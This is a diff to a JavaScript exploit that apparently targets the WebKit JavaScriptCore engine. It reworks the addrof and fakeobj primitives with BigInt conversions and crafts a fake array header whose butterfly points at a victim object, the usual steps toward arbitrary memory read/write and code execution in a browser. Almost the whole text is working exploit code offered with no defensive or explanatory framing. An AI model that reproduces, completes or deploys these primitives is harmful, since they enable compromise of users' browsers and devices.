@@ -509,13 +509,17 @@ var VM_PROT_EXECUTE = 0x4
             obj.fakeButterfly = b1;
             fakeArr[1] = bigint2float(doubleArrayButterfly);
             fakeobj = (addr) => {
-              a1[0] = addr;
+              a1[0] = bigint2float(addr);
               return b1[0];
             }
             addrof = (val) => {
               b1[0] = val;
-              return a1[0];
+              return float2bigint(a1[0]);
             }
+              /*fakeobj = (addr) => {
+                  fakeArr
+              }*/
+             //let me try my own fakeobj method.
             
             port.postMessage("We got stableish addrof and fakeobj");
             
@@ -560,9 +564,9 @@ var VM_PROT_EXECUTE = 0x4
     print(`[+] victim @ ${addrof(victim)}`);
 
     // craft a fake object to modify victim
-    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
+    var flags_double_array = 0x0108200700001000n;
     var container = {
-        header: flags_double_array,
+        header: bigint2float(unboxDouble(flags_double_array)),
         butterfly: victim
     };
 
@@ -570,7 +574,7 @@ var VM_PROT_EXECUTE = 0x4
     var containerAddr = addrof(container);
     print(`[+] container @ ${containerAddr}`);
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(Add(containerAddr, 0x10));
+    var hax = fakeobj(containerAddr + 0x10n);
     var maxtry = 0;
     if (hax instanceof Array) {
             print("got fakeobj with real struct id");
